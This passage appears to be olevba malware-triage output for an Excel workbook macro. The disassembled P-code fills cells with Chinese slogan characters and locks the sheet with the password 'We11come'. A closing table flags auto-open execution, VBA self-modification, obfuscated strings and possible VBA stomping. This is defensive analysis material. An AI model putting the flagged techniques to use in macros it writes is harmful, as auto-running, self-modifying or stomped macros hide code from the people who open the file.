' 	LitStr 0x0000 ""
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #201:
' 	LitStr 0x0003 "F11"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #202:
' 	LitStr 0x0002 "奉"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #203:
' 	LitStr 0x0003 "F12"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #204:
' 	LitStr 0x0002 "献"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #205:
' 	LitStr 0x0003 "F13"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #206:
' 	LitStr 0x0000 ""
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #207:
' 	LitStr 0x0003 "F14"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #208:
' 	LitStr 0x0000 ""
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #209:
' 	LitStr 0x0003 "F15"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #210:
' 	LitStr 0x0002 "团"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #211:
' 	LitStr 0x0003 "F16"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #212:
' 	LitStr 0x0002 "结"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #213:
' 	LitStr 0x0003 "F17"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #214:
' 	LitStr 0x0000 ""
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #215:
' 	LitStr 0x0003 "F18"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #216:
' 	LitStr 0x0002 "进"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #217:
' 	LitStr 0x0003 "F19"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #218:
' 	LitStr 0x0002 "取"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #219:
' 	LitStr 0x0003 "F20"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #220:
' 	LitStr 0x0000 ""
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #221:
' 	LitStr 0x0002 "E6"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #222:
' 	LitStr 0x0000 ""
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #223:
' 	LitStr 0x0002 "E7"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #224:
' 	LitStr 0x0000 ""
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #225:
' 	LitStr 0x0002 "E8"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #226:
' 	LitStr 0x0002 "勤"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #227:
' 	LitStr 0x0002 "E9"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #228:
' 	LitStr 0x0002 "奋"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #229:
' 	LitStr 0x0003 "E10"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #230:
' 	LitStr 0x0000 ""
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #231:
' 	LitStr 0x0003 "E11"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #232:
' 	LitStr 0x0002 "严"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #233:
' 	LitStr 0x0003 "E12"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #234:
' 	LitStr 0x0002 "谨"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #235:
' 	LitStr 0x0003 "E13"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #236:
' 	LitStr 0x0000 ""
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #237:
' 	LitStr 0x0003 "E14"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #238:
' 	LitStr 0x0000 ""
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #239:
' 	LitStr 0x0003 "E15"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #240:
' 	LitStr 0x0002 "求"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #241:
' 	LitStr 0x0003 "E16"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #242:
' 	LitStr 0x0002 "实"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #243:
' 	LitStr 0x0003 "E17"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #244:
' 	LitStr 0x0000 ""
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #245:
' 	LitStr 0x0003 "E18"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #246:
' 	LitStr 0x0002 "创"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #247:
' 	LitStr 0x0003 "E19"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #248:
' 	LitStr 0x0002 "新"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #249:
' 	LitStr 0x0003 "E20"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #250:
' 	LitStr 0x0000 ""
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #251:
' 	LitStr 0x0003 "E21"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #252:
' 	LitStr 0x0000 ""
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #253:
' 	LitStr 0x0003 "d19"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #254:
' 	LitStr 0x0001 "S"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #255:
' 	LitStr 0x0003 "D20"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #256:
' 	LitStr 0x0001 "U"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #257:
' 	LitStr 0x0003 "D21"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #258:
' 	LitStr 0x0001 "F"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #259:
' 	LitStr 0x0003 "D22"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #260:
' 	LitStr 0x0001 "E"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #261:
' 	LitStr 0x0002 "A1"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #262:
' 	LitStr 0x0008 "We11come"
' 	ParamNamed Password 
' 	LitVarSpecial (True)
' 	ParamNamed DrawingObjects 
' 	LitVarSpecial (True)
' 	ParamNamed Contents 
' 	LitVarSpecial (True)
' 	ParamNamed Scenarios 
' 	Ld ActiveSheet 
' 	ArgsMemCall Protect 0x0004 
' Line #263:
' 	Label theEnd 
' Line #264:
' 	EndIfBlock 
' Line #265:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Base64    |IAD                 |SUFE                                         |
|String    |                    |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

